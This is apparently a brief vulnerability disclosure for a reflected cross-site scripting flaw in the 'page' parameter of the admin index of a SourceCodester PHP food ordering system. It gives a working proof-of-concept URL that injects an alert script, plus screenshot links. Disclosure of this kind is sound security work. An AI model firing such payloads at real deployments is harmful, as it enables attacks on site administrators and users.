vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212480753-2293f1b8-42f6-421a-aa69-77274c489008.png)
http://192.168.249.88/php-fos-db/admin/index.php?page=%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
![image](https://user-images.githubusercontent.com/30823782/212480767-dedc6f07-fbe1-49c5-9bfe-aa6ece2502af.png)

